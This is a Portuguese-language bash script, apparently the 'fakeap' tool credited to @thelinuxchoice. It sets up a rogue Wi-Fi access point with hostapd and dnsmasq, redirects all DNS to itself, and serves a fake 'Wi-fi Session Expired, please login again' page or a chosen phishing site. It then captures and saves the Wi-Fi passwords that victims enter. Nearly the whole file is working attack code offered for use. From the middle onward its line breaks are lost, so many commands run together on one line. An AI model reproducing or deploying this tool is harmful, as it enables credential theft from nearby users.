#!/bin/bash

trap 'printf "\n"; stop; exit 1' 2

list_folders() {
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Pastas disponíveis:\e[0m\n"
  counter=1
  for folder in $(ls -d */) ; do
    printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $folder
    let counter++
  done
}

dependencies() {
  command -v php > /dev/null 2>&1 || { echo >&2 "O php é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
  command -v dnsmasq > /dev/null 2>&1 || { echo >&2 "O dnsmasq é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
  command -v hostapd > /dev/null 2>&1 || { echo >&2 "O hostapd é necessário, mas não está instalado. Instale-o. Abortando."; exit 1; }
}

banner()  {
  printf "\e[1;77m8888888888       888                           \e[0m\e[1;92m[d8888 8888888b. \e[0m\n" 
  printf "\e[1;77m888              888                          \e[0m\e[1;92md88888 888   Y88b \e[0m\n"
  printf "\e[1;77m888              888                         \e[0m\e[1;92md88P888 888    888 \e[0m\n"
  printf "\e[1;77m8888888  8888b.  888  888  .d88b.           \e[0m\e[1;92md88P 888 888   d88P \e[0m\n"
  printf "\e[1;77m888          88b 888 .88P d8P  Y8b         \e[0m\e[1;92md88P  888 8888888P  \e[0m\n"
  printf "\e[1;77m888     .d888888 888888K  88888888 888888 \e[0m\e[1;92md88P   888 888        \e[0m\n"
  printf "\e[1;77m888     888  888 888  88b Y8b.           \e[0m\e[1;92md8888888888 888        \e[0m\n"
  printf "\e[1;77m888      Y888888 888  888   Y8888       \e[0m\e[1;92md88P     888 888\e[0m\e[1;77m v1.0\e[0m\n"
  printf "\n"
  printf "\e[1;31m                   .-  _           _  -. \n"
  printf "                  /   /             \   \ \n"
  printf "                 (   (  (\` (-o-) \`)  )   ) \n"
  printf "                  \   \_ \`  -+-  \` _/   / \n"
  printf "                   \`-       -+-       -\` \n"
  printf "                            -+- \e[0m\e[1;77mCoded by: @thelinuxchoice\e[0m\n"
  printf "\n"
}

catch_cred() {
  IFS=$'\n'
  password=$(grep -o 'Pass:.*' credentials.txt | cut -d ":" -f2)
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m SSID:\e[0m\e[1;77m %s\n\e[0m" $use_ssid
  printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m]\e[0m\e[1;92m Password:\e[0m\e[1;77m %s\n\e[0m" $password
  printf " SSID: %s\n" $use_ssid >> saved.credentials.txt
  cat credentials.txt >> saved.credentials.txt
  printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m]Salvo em:\e[1;77m saved.credentials.txt\e[0m\n" stop exit 1 }getcredentials() { printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Aguardando credenciais ...\e[0m\n" while [ true ]; do if [[ -e "credentials.txt" ]]; then printf "\n\e[1;93m[\e[0m*\e[1;93m]\e[0m\e[1;92m Credenciais encontradas!\n" catch_cred fi sleep 1 done }createpage() { default_cap1="Wi-fi Session for '$use_ssid' Expired!" default_cap2="Please login again." #default_user_text="Username:" default_pass_text="Password" default_sub_text="Log-In"read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Título 1 (Padrão: Wi-fi Session for SSID Expired!): \e[0m' cap1 cap1="${cap1:-${default_cap1}}"read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Título 2 (Padrão: Please login again.): \e[0m' cap2 cap2="${cap2:-${default_cap2}}"#read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de nome de usuário (Padrão: Username:): \e[0m' user_text #user_text="${user_text:-${default_user_text}}"read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de senha (Padrão: Password:): \e[0m' pass_text pass_text="${pass_text:-${default_pass_text}}"read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Campo de envio (Padrão: Log-In): \e[0m' sub_text sub_text="${sub_text:-${default_sub_text}}"echo "" > index.html echo "" >> index.html echo "<body bgcolor="gray" text="white">" >> index.html IFS=$'\n' printf ' %s  %s \n' $cap1 $cap2 >> index.html IFS=$'\n' printf '%s \n' $user_text >> index.html IFS=$'\n' #printf '\n' >> index.html #IFS=$'\n' printf '%s: ' $pass_text >> index.html IFS=$'\n' printf '\n' >> index.html IFS=$'\n' printf '\n' $sub_text >> index.html printf '' >> index.html printf '\n' >> index.html printf '\n' >> index.html }list_fake_sites() { printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Sites falsos disponíveis:\e[0m\n" counter=1 for site in $(ls *.php) ; do printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $site let counter++ done }choose_fake_site() { read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Escolha um site falso pelo número:\e[0m ' fake_site_number fake_site=$(ls .php | sed -n "${fake_site_number}p") if [[ -z "$fake_site" ]]; then printf "\e[1;91m[\e[0m\e[1;77m!\e[0m\e[1;91m] Opção inválida. Saindo.\e[0m\n" exit 1 fi printf "\e[1;92m[\e[0m\e[1;77m\e[0m\e[1;92m] Site falso escolhido: %s\e[0m\n" $fake_site }server() { printf "\e[1;92m[\e[0m*\e[1;92m] Iniciando servidor php...\n" php -S 192.168.1.1:80 > /dev/null 2>&1 & sleep 2 getcredentials }stop() { printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\n" killall dnsmasq hostapd > /dev/null 2>&1 sleep 4 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Reiniciando o Serviço de Rede..\n" service networking restart sleep 5 }start() { if [[ -e credentials.txt ]]; then rm -rf credentials.txt fiinterface=$(ifconfig -a | sed 's/[ \t].*//;/^$/d' | tr -d ':' > iface)counter=1 for i in $(cat iface); do printf "\e[1;92m%s\e[0m: \e[1;77m%s\n" $counter $i let counter++ doneread -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Interface para usar:\e[0m ' use_interface choosed_interface=$(sed ''$use_interface'q;d' iface) IFS=$'\n' read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] SSID para usar:\e[0m ' use_ssid read -p $'\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Canal para usar:\e[0m ' use_channel createpage list_fake_sites choose_fake_site printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Encerrando todas as conexões..\e[0m\n" sleep 2 killall network-manager hostapd dnsmasq wpa_supplicant dhcpd > /dev/null 2>&1 sleep 5 printf "interface=%s\n" $choosed_interface > hostapd.conf printf "driver=nl80211\n" >> hostapd.conf printf "ssid=%s\n" $use_ssid >> hostapd.conf printf "hw_mode=g\n" >> hostapd.conf printf "channel=%s\n" $use_channel >> hostapd.conf printf "macaddr_acl=0\n" >> hostapd.conf printf "auth_algs=1\n" >> hostapd.conf printf "ignore_broadcast_ssid=0\n" >> hostapd.conf printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s desligada\n" $choosed_interface ifconfig $choosed_interface down sleep 4 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] Configurando %s para modo monitor\n" $choosed_interface iwconfig $choosed_interface mode monitor sleep 4 printf "\e[1;92m[\e[0m\e[1;77m*\e[0m\e[1;92m] %s Ligada\n" $choosed_interface ifconfig wlan0 up sleep 5 hostapd hostapd.conf > /dev/null 2>&1 & sleep 6 printf "interface=%s\n" $choosed_interface > dnsmasq.conf printf "dhcp-range=192.168.1.2,192.168.1.30,255.255.255.0,12h\n" >> dnsmasq.conf printf "dhcp-option=3,192.168.1.1\n" >> dnsmasq.conf printf "dhcp-option=6,192.168.1.1\n" >> dnsmasq.conf printf "server=8.8.8.8\n" >> dnsmasq.conf printf "log-queries\n" >> dnsmasq.conf printf "log-dhcp\n" >> dnsmasq.conf printf "listen-address=127.0.0.1\n" >> dnsmasq.conf printf "address=/#/192.168.1.1\n" >> dnsmasq.conf ifconfig $choosed_interface up 192.168.1.1 netmask 255.255.255.0 sleep 1 route add -net 192.168.1.0 netmask 255.255.255.0 gw 192.168.1.1 sleep 1 dnsmasq -C dnsmasq.conf -d > /dev/null 2>&1 & sleep 5 printf "\e[1;93m[\e[0m\e[1;77m*\e[0m\e[1;93m] Para Parar: ./fakeap.sh --stop\n" server }case "$1" in --stop) stop ;;
 *)
 banner 
dependencies 
start 
;; 
esac